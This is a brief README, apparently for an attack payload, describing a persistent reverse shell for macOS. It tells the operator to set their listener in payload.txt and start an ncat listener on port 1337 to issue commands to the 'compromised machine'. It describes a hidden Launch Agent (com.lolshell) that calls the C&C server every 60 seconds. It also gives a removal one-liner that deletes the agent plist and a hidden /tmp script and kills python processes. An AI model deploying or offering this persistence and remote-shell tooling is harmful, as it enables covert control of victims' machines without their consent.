# Persistent reverse shell for OSX
This reverse shell is persistent. You will need to modify payload.txt with your listener.

## Start listener
From your server that you want the compromised machine to be issued commands
```
$ ncat -nvlp 1337
```

## Remove persistent reverse shell
This will remove the reverse shell and it's associated Launch Agent (this was used to call the C&C server every 60 seconds).
```
$ launchctl remove com.lolshell && rm ~/Library/LaunchAgents/com.lolshell.plist /tmp/.lolshell.sh; pkill -f python\ \-c
```
